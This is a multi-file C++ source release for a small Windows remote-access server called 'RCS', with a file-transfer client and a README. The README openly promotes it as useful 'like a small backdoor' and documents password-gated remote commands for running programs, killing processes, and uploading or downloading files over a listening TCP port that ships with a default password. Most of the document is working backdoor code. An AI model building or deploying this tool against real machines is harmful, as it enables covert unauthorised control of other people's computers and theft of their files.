#define MENO_FAILU 256	// velikost mena souboru
#define BUFF 1024	// buffer ke prenosu dat

void getstr(char *buf, int kolik_max)
{
	int i=0;
	char znak;

	while(znak != '\r' && i < kolik_max)
	{
		znak = getch();
		if(znak == '\r')
		{
			buf[i] = '\0';
			i++;
		}
		if(znak > 31 && znak < 127)
		{
			buf[i] = znak;
			i++;
			printf("%c", znak);
		}
	}
}

unsigned char getbyte()
{
	int i=0;
	char znak;
	char string[6];
	unsigned int byte;

start:

	i = 0;
	while(znak != '\r' && i < 3)
	{
		znak = getch();
		if(znak == '\r')
		{
			string[i] = '\0';
			i++;
		}
		if(znak > 47 && znak < 58)
		{
			string[i] = znak;
			i++;
			printf("%c", znak);
		}
	}
	string[i] = '\0';

	byte = atoi(string);
	if(byte < 0 || byte > 256)
	{
		printf("%c%c%c", 8, 8, 8);
		printf("   ");
		printf("%c%c%c", 8, 8, 8);
		goto start;
	}
	return (char)byte;
}

void copystrd(char *str1, char *str2, int x)
{
	int i;
	for(i=0;i < x; i++)
	{
		str1[i] = str2[i];
	}
	str1[i] = '\0';
}

int main(int argc, char* argv[])
{
	// promeny
//	int i;	// iteracni hodnota
	HANDLE hfile;
	char fail[MENO_FAILU]; // jmeno souboru
	char down_up; // hjodnota podle ktere se bud stahuje nebo posila
	int port;
	char buffer[BUFF+1];
	char test[10];
	DWORD pocet_zap;

	// inicializace
	WORD wVersionRequested=0;
    WSADATA WSAData;
	SOCKET sock;
	sockaddr_in addr;

	wVersionRequested = MAKEWORD(2, 2);
	if(WSAStartup(wVersionRequested, &WSAData) != 0)
		return -1;
	
	sock = socket(AF_INET, SOCK_STREAM, 0);
	
	//  vlastni zacatek kodu
	printf("Welcome to the RCS Transfer utilit 0.0.1\r\n");

server:

	printf("\r\nZadejte ip adresu ve tvaru cislo enter: ");

	addr.sin_addr.S_un.S_un_b.s_b1 = getbyte();
	printf(".");
	addr.sin_addr.S_un.S_un_b.s_b2 = getbyte();
	printf(".");
	addr.sin_addr.S_un.S_un_b.s_b3 = getbyte();
	printf(".");
	addr.sin_addr.S_un.S_un_b.s_b4 = getbyte();
	
	printf("\r\nZadejte port: ");
	scanf("%d", &port);

	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);

	if(connect(sock,(sockaddr *)&addr,sizeof(addr)))
	{	
		printf("Connect error spatna ip nebo port");
		goto server;
	}
	
	if(recv(sock, buffer, BUFF, 0) < 1)
	{
		printf("soket je nejakej divnej");
		return -1;
	}

	copystrd(test, buffer, 6);
	if(!strcmp(test, "upload"))
		down_up = 'u';

	copystrd(test, buffer, 8);
	if(!strcmp(test, "download"))
	{
		if(recv(sock, buffer, BUFF, 0) < 1)
		{
			printf("soket je nejakej divnej");
			return -1;
		}
		down_up = 'd';
	}

failn:
	
	printf("\r\nJmeno souboru: ");
	getstr(fail, MENO_FAILU);
		
	if(down_up == 'u')
	{
		hfile = CreateFile(fail, GENERIC_READ, FILE_SHARE_READ, NULL,
			OPEN_EXISTING, 0, NULL);
		if(hfile == INVALID_HANDLE_VALUE)
		{
			printf("\r\nChyba pri otevirani souboru (nejspis neexistuje)");
			goto failn;
		}

		ReadFile(hfile, buffer, BUFF, &pocet_zap, NULL);

		while(pocet_zap != 0)
		{
			send(sock, buffer, pocet_zap, 0);
			ReadFile(hfile, buffer, BUFF, &pocet_zap, NULL);
		}
		
	}
	DWORD pocet_zapsano;

	if(down_up == 'd')
	{
		hfile = CreateFile(fail, GENERIC_WRITE, FILE_SHARE_READ, NULL,
			CREATE_NEW, 0, NULL);
		if(hfile == INVALID_HANDLE_VALUE)
		{
			printf("\r\nChyba pri otevirani souboru (nejspis uz existuje nebo je pouzivan)");
			goto failn;
		}

		send(sock, "y", 1, 0);
		for(;;)
		{
			pocet_zap = recv(sock, buffer, BUFF, 0);
			if(pocet_zap < 1)
			{
				// konec downloadu
				closesocket(sock);
				CloseHandle(fail);
				printf("\r\nKonec downloadu");
				return 0;
			}
			WriteFile(hfile, buffer, pocet_zap, &pocet_zapsano, NULL);
		}
	}

	closesocket(sock);
	CloseHandle(fail);
	printf("\r\nKonec uploadu");

	return 0;
}
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[FILETRAN.CPP]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[INTERPRET.CPP]ÄÄÄ
#include <stdio.h>
#include <winsock2.h>
#include <winsock.h>
#include <io.h>

#include "universal.h"
#include "commands.h"


int Interpret(SOCKET *client_socket, char pole[MAX_DELKA_RADKU])
{
	// prenos dat
	char provedeno = -1; // -1 ne  1 ano
	char prikaz[MAX_DELKA_PARAMETRU]; // podle nej se rozdeluje typ prikazu
	char parametry[MAX_DELKA_RADKU];  // parametry ktere se pøedavají do 4. v
	// pro testovani
	char prikazy[POCET_PRIKAZU][MAX_DELKA_PARAMETRU] = 
		{"pwd","cd","dir","ls","server","rename","copy","x","get",
		"put", "del","md","rd","move","ps","kill"}; // pole pøíkazù
	P_FCE pole_fci[POCET_PRIKAZU] = 
		{pwd,cd,dir,dir,server,m_rename,m_copy,x,download,upload,del,md,
		rd, m_move, ps, kill};						// pole pointrù na fce
	int i_fce;
	
	CopyStrToSpace(pole, prikaz, parametry);

	// ciklus porovnavajicí pøíkaz s uivatelskım vstupem
	for(i_fce = 0;i_fce < POCET_PRIKAZU;i_fce++)
		if(lstrcmp(prikazy[i_fce],prikaz) == 0)
		{
			// spuštìní pointru na funkci z tabulky
			(*(pole_fci[i_fce]))(client_socket, parametry);
			provedeno = 1;
		}
	return provedeno;
}
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[INTERPRET.CPP]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[OBSLUHA.CPP]ÄÄÄ
#include <stdio.h>
#include <winsock2.h>
#include <winsock.h>
#include <io.h>

#include "universal.h"

// globalni promneny pro pocitani tredu a pristup k serveru
extern int pocet_tredu; // urcuje pocet tredu na obsluhu useru    pocet useru = pocet tredu
extern char server_close;  // pristup pro ostatni usery   1 - zavren   0 - otevren 
// nastaveni
extern NASTAVENI_DATA nast; // structura pro nastaveni

// fce pro kterou se spousti vlastni thread
DWORD WINAPI ServClient(LPVOID addr_client_socket)
{
	
	SOCKET client_socket;
	client_socket = *((SOCKET *) addr_client_socket);
	
	char password = 0, odezva_klaves = 1, nastaveni = 0;
	char znak='\0', last_znak='\0';
	char i=0;
	char pole[MAX_DELKA_RADKU];
	int error;
	char password_str[80];
	
	pocet_tredu++; // pricte se jeden tred 
	
	send(client_socket, "Hi server 0.0.6", 16, 0);
	
	for(;;)
	{
		send(client_socket, "\r\n\r\n"PROMPT, 4+DEL_PROMPTU ,0);
		// vymazani pole
		for(i=0;i<MAX_DELKA_RADKU;i++)
			pole[i] = '\0';
		
		i=0;
		
		// smicka pro nacteni retezce 
		while( ((last_znak != 0x0d) || (znak != 0x0a)) ) // porovnani entru
		{
			last_znak=znak; // pro porovnani entru
			
			error = recv(client_socket, &znak, 1,0);
			if (error <= 0) // mensi nebo rovno aby se nezaciklil
			{
		
				closesocket(client_socket);
				pocet_tredu--; // odecte se jeden tred
				if(pocet_tredu == 0)
					server_close = 0; // nastavuje otevreni serveru pri odpojeni uzivatele
				ExitThread(-1);
			}
			
			
			// pro mazani znaku
			if((znak == 0x08) && (i > 0))
			{
				send(client_socket, &znak, 1,0);
				i--;
			}
			
						
			// do pole se zapisuji jen textovy znaky a neprahani se delka
			if(((znak > 0x1f) && (znak < 0xff)) && (i < MAX_DELKA_RADKU))
			{
				pole[i]=znak;
				if(odezva_klaves == 1)
					send(client_socket, &znak, 1,0);
				
				i++;		
			}
		
		}
		pole[i]='\0';
		znak='\0';
		last_znak='\0';
		
		// konec bloku pro nacitani

		// disconect musi fungovat i bez hesla
		if(lstrcmp(pole,"exit") == 0)
		{
			closesocket(client_socket);
			pocet_tredu--; // odecte se jeden tred
			if(pocet_tredu == 0)
				server_close = 0; // nastavuje otevreni serveru pri odpojeni uzivatele
			ExitThread(0);
		}
		
		//nastaveni odezvy
		if(lstrcmp(pole,"echo off") == 0)
		{ odezva_klaves = 0; nastaveni = 1; }
		if(lstrcmp(pole,"echo on") == 0)
		{ odezva_klaves = 1; nastaveni = 1; }
		
		// testovani hesla
		lstrcpy(password_str, "password ");
		lstrcat(password_str, nast.passwd);
		if(!lstrcmp(pole, password_str))
		{	
			password = 1;
			nastaveni = 1;
			send(client_socket, "\r\nPassword accept", 17, 0);
		}

		// spousti vlastni interpret
		if((password == 1 && nastaveni != 1)) 
		{
			if((Interpret(&client_socket,pole)) == 1)
				nastaveni = 1;
		}
		
		// vypisuje neznamej prikaz 
		if(nastaveni == 0) 
			send(client_socket, "\r\n???", 5,0);
		
		// umoznuje preskakovat urcite operace pri nastavovani
		nastaveni = 0;
	}
	ExitThread(0);
	return 0;
}
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[OBSLUHA.CPP]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[SERVER.CPP]ÄÄÄ
#include <stdio.h>
#include <winsock2.h>
#include <winsock.h>
#include <io.h>

#include "universal.h"

int CreateSocket(int tcp_port, SOCKET *primar_socket)
{
	
	struct sockaddr_in	serv_addr;

	// vytvoreni socketu
	*primar_socket = socket(AF_INET, SOCK_STREAM, 0);
	if(*primar_socket < 0)
		return -2;


	// struktura kterou vzuziva bind pri poveseni na port
	serv_addr.sin_family		= AF_INET; // rodina protokolu
	serv_addr.sin_addr.s_addr	= htonl(INADDR_ANY); // prevadi IP
	serv_addr.sin_port			= htons(tcp_port); // prevadi port TCP
	
	// povesi sever na port structura serv_addr se musi pretipovat
	if((bind(*primar_socket, (struct sockaddr *) &serv_addr , 
		sizeof(serv_addr))) < 0)
			return -3;
	

	// fce ktera nastavi frontu
	if((listen(*primar_socket, 5)) < 0)
		return -5;
	
	return 0;
}
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[SERVER.CPP]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[STDAFX.CPP]ÄÄÄ
// stdafx.cpp : source file that includes just the standard includes
//	rcs.pch will be the pre-compiled header
//	stdafx.obj will contain the pre-compiled type information

#include "stdafx.h"

// TODO: reference any additional headers you need in STDAFX.H
// and not in this file
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[STDAFX.CPP]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[STDAFX.H]ÄÄÄ
// stdafx.h : include file for standard system include files,
//  or project specific include files that are used frequently, but
//      are changed infrequently
//

#if !defined(AFX_STDAFX_H__A9DB83DB_A9FD_11D0_BFD1_444553540000__INCLUDED_)
#define AFX_STDAFX_H__A9DB83DB_A9FD_11D0_BFD1_444553540000__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#define WIN32_LEAN_AND_MEAN		// Exclude rarely-used stuff from Windows headers

#include <windows.h>


// TODO: reference additional headers your program requires here

//{{AFX_INSERT_LOCATION}}
// Microsoft Visual C++ will insert additional declarations immediately before the previous line.

#endif // !defined(AFX_STDAFX_H__A9DB83DB_A9FD_11D0_BFD1_444553540000__INCLUDED_)
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[STDAFX.H]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[UFCE.CPP]ÄÄÄ
#include <stdio.h>
#include <winsock2.h>
#include <winsock.h>
#include <io.h>

#include "universal.h"

// nastaveni
extern NASTAVENI_DATA nast; // structura pro nastaveni

int CopyStrToSpace(char pole[MAX_DELKA_RADKU], char first[MAX_DELKA_PARAMETRU], char second[MAX_DELKA_RADKU])
{

	char i_pole=0;
	char i_uni=0;

	// precte prvni cast retezce do mezery
	while((pole[i_pole] != ' ') && (i_pole < (MAX_DELKA_PARAMETRU-1)) && (pole[i_pole] !='\0'))
	{
		first[i_uni] = pole[i_pole];
		i_uni++;
		i_pole++;
	}
	first[i_uni] = '\0';
	i_uni = 0;
	
	// preskoci mezery
	while((pole[i_pole] == ' ') && (pole[i_pole] != '\0'))
	{
		i_pole++;
		if(i_pole >= (MAX_DELKA_RADKU-1))
			return 0;
	}

	//zkopiruje druhou cast
	while((pole[i_pole] != '\0') && (i_pole < (MAX_DELKA_RADKU-1)))
	{
		second[i_uni] = pole[i_pole];
		i_uni++;
		i_pole++;
	}
	second[i_uni] = '\0';
	return 0;
}

int LoadNas(char *file_str)
{
	HANDLE file;
	unsigned long read;


	file = CreateFile(file_str, GENERIC_READ, FILE_SHARE_READ, NULL,
		OPEN_EXISTING, 0, NULL);
	
	
	if(file == INVALID_HANDLE_VALUE)
	{
		lstrcpy(nast.passwd, STANDART_PASSWD);
		nast.tcp_p = STANDART_TCP_PORT;
		CloseHandle(file);		
		return -1;
	}
	
	if(GetFileSize(file, NULL) < sizeof(nast))
	{
		lstrcpy(nast.passwd, STANDART_PASSWD);
		nast.tcp_p = STANDART_TCP_PORT;
		CloseHandle(file);
		return -1;
	
	}
	
	// doresit
	SetFilePointer(file, sizeof(nast), NULL, FILE_END);

	ReadFile(file, &nast, sizeof(nast), &read, NULL);
	
	if(nast.tcp_p < 0  && nast.tcp_p > 65535)
	{
		nast.tcp_p = STANDART_TCP_PORT;
	}

	CloseHandle(file);
	return 0;
}

// registrace jako service   nedodelano
int RegService()
{
/*	SC_HANDLE handle_manager, handle_ser;	
	
	handle_manager = OpenSCManager("xxx", "xxxx", SC_MANAGER_CREATE_SERVICE);

	handle_ser = CreateService(handle_manager, "xxxxx", "xxxxx", SERVICE_ALL_ACCESS,
		0x10, 0x2, 0, "c:\myproject\rcs\relase\rcs.exe", 0, 0, 0, 0, 0);
	if(handle_xx == NULL)
	{
		MessageBox(NULL, "error in CreateService", "rcs error.", MB_OK);
	}
	
	StartService
*/
	return 0;
}
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[UFCE.CPP]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[UNIVERSAL.H]ÄÄÄ
#ifndef _universal_h_
#define _universal_h_

// define
#define PROMPT "$"
#define DEL_PROMPTU 1	// delka promptu
#define STANDART_TCP_PORT 6000
#define STANDART_PASSWD "invite"
#define MAX_DELKA_RADKU 100
#define POCET_PRIKAZU 16	// v interpretu
#define MAX_DELKA_PARAMETRU 20
#define MAX_USERS 100	//definuje maximum uzivatelu najednou prihlasenejch
#define DELITKO_RETEZCU '\"'	// uvozovani retezcu u spec. fci
#define	MAX_PRINT_PROCES 1024	// pocet vypisovanejch procesu u fce ps

// typy
typedef int (*P_FCE)(SOCKET*, char*);

struct DATA_PREN
{
	char name_file[MAX_DELKA_PARAMETRU];
	int port;
};

struct NASTAVENI_DATA
{
	char passwd[50];
	int tcp_p;
	char registrovan; // rezervovano
};

// prototypy fci 
int Interpret(SOCKET *client_socket, char pole[MAX_DELKA_RADKU]);

DWORD WINAPI ServClient(LPVOID addr_client_socket);

int CreateSocket(int tcp_port, SOCKET *primar_socket);

int Interpret(SOCKET *client_socket, char pole[MAX_DELKA_RADKU]);

int CopyStrToSpace(char pole[MAX_DELKA_RADKU], char first[MAX_DELKA_PARAMETRU], char second[MAX_DELKA_RADKU]);

int LoadNas(char *file_str);

int RegService();
#endif
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[UNIVERSAL.H]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[README.TXT]ÄÄÄ
Description:

I created this program becoz of nonexistency of some good computer remote control programz.
Some of them are too huge or not very functional. I decided to write something that would be
small, fast and could do basic and important thingz - disk operationz, process executing and
killing, upload, download... Program was developed in MS Visual Studio 6.0 and is primarly
designed for Windows 2000. Most of functionz can run even under other systemz (NT, 9x, ME, XP),
nevertheless it wasn't much tested.
Logical structure of the program is created in 4 layerz (inicialisation and user management,
network communication, interpret and commandz). This structure allows easy code correction for
new functionz and user communication environment.
For file transfering there is a program which connectz (like console) to preddefined port
where it downloadz and storez the file. This system should be later corrected for graphical
client which unfortunately hadnt been coded (becoz of that fucking lazy Dakron) and so there
existz and worx only this system.
At last I would like to mention that this program is very useful like a small backdoor - it can
easily transfer and execute other programz on the remote computer, sourcez are free and so
everybody can add to this source other featurez (registry editting, message sending etc...).

Skirit

(translation from Czech to English by Benny/29A)


Contact:
Skirit
skirit@seznam.cz
ICQ: 108723845


Thanx:
Ard-Gallen 	- ard-gallen@seznam.cz
		for his theoretical and practical help with developement and debugging

Benny/29a	- benny@post.cz
		for his theoretical help with developement and optimization


Greetz:
Hawk - tak co keho si zase vymlel :)
Ard-Gallen - tvoje prdel pozna co je to stredovek :) (nebo uz poznala ?)
Nevile and Gr33n - kdy se zase ozerem ?
Benny - uz to nehul !
Mymu bratrancovi Jurovi - ty uz to taky nehul :)


Commandz:

**rcs.exe**
valid for server manipulation from telnet before setting password

*echo
- turnz on/off the server reply. use in case you have already set local reply in your telnet client.
- paramz:
  "off"		- turnz off the reply (example: $echo off)
  "on"		- turnz on the reply (example: $echo on)

*password
- accessez other functionz after right password is set
- paramz:
  "password"	- preddefined password set setup program (example: $password blabla)
NOTE: if the part for implicit password setting is corrupted then the password is "test" and the serverz port is 6000.

*exit
- closez connection and turn off the maintance thread (example: $exit)


these commandz are valid only when right password is set:

*pwd
- typez current directory
- no paramz


*cd
- changez current directory
- paramz:
  "relative/full path"	- example: $cd c:\test\blah
NOTE: if there'z connected more than one user on server this command may work a bit weird.
it's becoz the environment is the same for all userz, it meanz that if one user changez
directory and the second changez directory again, current direstory is specified by second
user then. you can solve it by "server" command (see below).


*dir or ls
- lists current directory
- paramz:
  nothing	- lists current directory content
  mask		- lists current directory content specified by mask
  path		- lists specified directory content
  path\mask	- lists specified directory content specified by mask


*server
- showz informationz about server: number of userz, opened/closed state.
- openz and closez server for access
- paramz:
  nothing	- showz server informationz and number of userz
  open		- openez the server for access
  close		- closez the server for access (no user can connect then)

NOTE: when the connection is lost the server automatically setz itself to open state. if there will occure some bug inside the thread (theoreticaly impossible :-) you will have to restart the server (that may be sometimez a problem).


*rename
*copy
*move
*rd
*md
*del
- these commandz work the same way as under DOS


*x
- executez program
- paramz:
  "path\name argz"	- the pathname and filename of the program and argumentz (example: $x notepad.exe file.txt)


*ps
- lists all processez in system
- paramz:
  name/PID


*kill
- killz process specified by PID
- paramz:
  PID


*put
- sendz specified file
- paramz:
  filename port		- example: $put c:\file.txt 6001

*get
- recievez specified file
- paramz:
  filename port		- example: $get c:\file.txt 6001
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[README.TXT]ÄÄÄ
